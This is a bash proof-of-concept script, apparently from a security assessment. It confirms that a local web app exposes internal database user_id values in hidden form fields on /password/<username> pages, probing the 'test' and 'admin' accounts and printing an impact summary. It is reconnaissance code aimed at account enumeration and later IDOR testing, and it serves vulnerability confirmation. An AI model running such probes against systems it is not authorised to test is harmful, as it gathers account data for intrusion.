#!/bin/bash

# POC: User ID Disclosure in Hidden Form Fields
# This POC demonstrates that internal database user_id values are exposed
# in hidden HTML form fields on the password authentication page

TARGET="http://localhost:8082"
USERNAME="test"

echo "=========================================="
echo "POC: User ID Disclosure in Hidden Fields"
echo "=========================================="
echo ""

echo "[*] Testing username: $USERNAME"
echo "[*] Accessing password page: $TARGET/password/$USERNAME"
echo ""

# Fetch the password page and extract the hidden user_id field
RESPONSE=$(curl -s "$TARGET/password/$USERNAME")

# Check if we got a valid response (not redirected)
if echo "$RESPONSE" | grep -q "user_id"; then
    echo "[+] SUCCESS: Hidden user_id field found in HTML!"
    echo ""
    
    # Extract and display the user_id value
    USER_ID=$(echo "$RESPONSE" | grep -o 'name="user_id" value="[^"]*"' | grep -o 'value="[^"]*"' | cut -d'"' -f2)
    
    if [ ! -z "$USER_ID" ]; then
        echo "[+] Exposed user_id: $USER_ID"
        echo ""
        
        # Show the full hidden field HTML
        echo "[*] Full hidden field HTML:"
        echo "$RESPONSE" | grep -A 1 -B 1 'name="user_id"' | head -5
        echo ""
        
        echo "[!] VULNERABILITY CONFIRMED"
        echo "[!] Internal database identifier exposed to client"
        echo ""
        echo "Impact:"
        echo "  - Reveals internal database ID schema"
        echo "  - Enables database reconnaissance"
        echo "  - Facilitates IDOR testing with known IDs"
        echo "  - Violates principle of least privilege"
        echo ""
        
        # Test with another username to show pattern
        echo "[*] Testing another username to demonstrate pattern..."
        USERNAME2="admin"
        RESPONSE2=$(curl -s "$TARGET/password/$USERNAME2")
        
        if echo "$RESPONSE2" | grep -q "user_id"; then
            USER_ID2=$(echo "$RESPONSE2" | grep -o 'name="user_id" value="[^"]*"' | grep -o 'value="[^"]*"' | cut -d'"' -f2)
            if [ ! -z "$USER_ID2" ]; then
                echo "[+] Username '$USERNAME2' also exposes user_id: $USER_ID2"
                echo "[!] Pattern confirmed: All valid usernames expose internal user_id"
            fi
        fi
        
        exit 0
    else
        echo "[-] Could not extract user_id value"
        exit 1
    fi
else
    echo "[-] No user_id field found in response"
    echo "[*] Response may be a redirect or username may be invalid"
    exit 1
fi